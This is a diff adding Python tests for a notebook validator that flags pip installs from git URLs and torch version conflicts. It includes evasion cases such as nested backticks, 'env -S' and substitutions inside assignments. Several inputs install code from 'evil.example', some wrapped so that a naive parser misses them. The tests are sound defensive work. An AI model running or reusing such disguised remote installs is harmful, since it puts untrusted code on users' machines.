@@ -2656,3 +2656,106 @@ def test_a_quoted_word_survives_prefix_stripping():
         "pip install git+https://x/e.git",
         True,
     )
+
+
+def test_a_probe_guard_does_not_count_as_an_install():
+    """`A && B` runs B only when A succeeded, so a guarded install may never happen.
+
+    `nvidia-smi && pip install torch==2.12.0` installs nothing on a CPU box, and R-INST-004
+    is error severity, so replaying it reddened CI on a notebook that is correct. The
+    exception is a pip command on the left, which the replay already models as succeeding:
+    `pip install a && pip install b` is the ordinary chained idiom and dropping its second
+    half would cost far more coverage than the false positives it prevents.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
+
+    for guarded in ('!false && pip install "torch==2.12.0"',
+                    '!nvidia-smi && pip install "torch==2.12.0"'):
+        assert nv.rule_inst_004_torchcodec_torch(guarded, colab, "nb.ipynb", 0) == [], guarded
+
+    for chained in ('!pip install numpy && pip install "torch==2.12.0"',
+                    '!pip install a && pip install b && pip install "torch==2.12.0"',
+                    '!uv pip install a && pip install "torch==2.12.0"'):
+        assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(
+            chained, colab, "nb.ipynb", 0)] == ["R-INST-004"], chained
+
+
+def test_a_substitution_keeps_its_whitespace_inside_an_assignment():
+    """`TOKEN=$(printf '%s' 'a b') pip install ...` is one assignment word then pip.
+
+    Ending the word at the space inside the substitution left `'%s'` as the supposed
+    executable, so R-INST-001 reported nothing for a line bash really runs the install on.
+    """
+    nv = _load_notebook_validator_module()
+
+    assert nv._strip_exec_prefixes(
+        "TOKEN=$(printf '%s' 'a b') pip install git+https://x/e.git"
+    ) == ("pip install git+https://x/e.git", True)
+    assert [f.rule for f in nv.rule_inst_001_git_plus(
+        "!TOKEN=$(printf '%s' 'a b') pip install git+https://evil.example/pkg.git", "nb.ipynb", 0
+    )] == ["R-INST-001"]
+    # Backticks in the same position, and the plain quoted form, still read as before.
+    assert nv._strip_exec_prefixes(
+        "TOKEN=`printf 'a b'` pip install git+https://x/e.git"
+    ) == ("pip install git+https://x/e.git", True)
+    assert nv._split_first_word('TOKEN="a b" pip install x') == ("TOKEN=a b", "pip install x")
+
+
+def test_a_nested_backtick_substitution_is_read_through():
+    """Legacy nesting escapes the inner delimiters so they do not close the outer one.
+
+    `find` stopped at the first escaped backtick, so the body came back as ``echo \\`` and the
+    pip call bash really runs went unscanned. The body also has to be unescaped on the way
+    out, or the inner substitution never opens on the second pass.
+    """
+    nv = _load_notebook_validator_module()
+
+    nested = "!echo `echo \\`pip install git+https://evil.example/pkg.git\\``"
+    assert nv._substitution_bodies(nested) == [
+        "echo `pip install git+https://evil.example/pkg.git`"
+    ]
+    assert [f.rule for f in nv.rule_inst_001_git_plus(nested, "nb.ipynb", 0)] == ["R-INST-001"]
+    # A single, unnested substitution is unchanged.
+    assert nv._substitution_bodies("echo `pip install x`") == ["pip install x"]
+
+
+def test_env_split_string_carries_the_command():
+    """`-S, --split-string=S: process and split S into separate arguments` (GNU coreutils).
+
+    Its operand is the command, so consuming it the way `-u NAME` is consumed left nothing
+    for parse_pip_line and R-INST-001 missed an install that really runs.
+    """
+    nv = _load_notebook_validator_module()
+
+    for spelling in ('env -S "pip install git+https://x/e.git"',
+                     'env --split-string "pip install git+https://x/e.git"',
+                     'env --split-string="pip install git+https://x/e.git"'):
+        assert nv._strip_exec_prefixes(spelling) == ("pip install git+https://x/e.git", True), spelling
+    assert [f.rule for f in nv.rule_inst_001_git_plus(
+        '!env -S "pip install git+https://evil.example/pkg.git"', "nb.ipynb", 0
+    )] == ["R-INST-001"]
+    # The flags that really do take a discardable operand are untouched.
+    assert nv._strip_exec_prefixes(
+        "env -u PIP_INDEX_URL pip install git+https://x/e.git"
+    ) == ("pip install git+https://x/e.git", True)
+    assert nv._strip_exec_prefixes(
+        "env --unset=PIP_INDEX_URL pip install git+https://x/e.git"
+    ) == ("pip install git+https://x/e.git", True)
+
+
+def test_a_dry_run_does_not_seed_the_resolved_set():
+    """Skipping `--dry-run` in the replay was not enough on its own.
+
+    `resolved_set` had already taken the starting version from the same command's pins, so a
+    resolution probe still produced an R-INST-004 about a version the cell never installs.
+    """
+    nv = _load_notebook_validator_module()
+    colab = {"torch": "2.11.0+cu128", "torchcodec": "0.11.0+cu128", "python": "3.12"}
+
+    probe = '!pip install --dry-run "torch==2.12.0"'
+    assert nv.resolved_set(probe, colab).get("torch") == "2.11.0+cu128"
+    assert nv.rule_inst_004_torchcodec_torch(probe, colab, "nb.ipynb", 0) == []
+    # A real install of the same pin is still judged.
+    assert [f.rule for f in nv.rule_inst_004_torchcodec_torch(
+        '!pip install "torch==2.12.0"', colab, "nb.ipynb", 0)] == ["R-INST-004"]
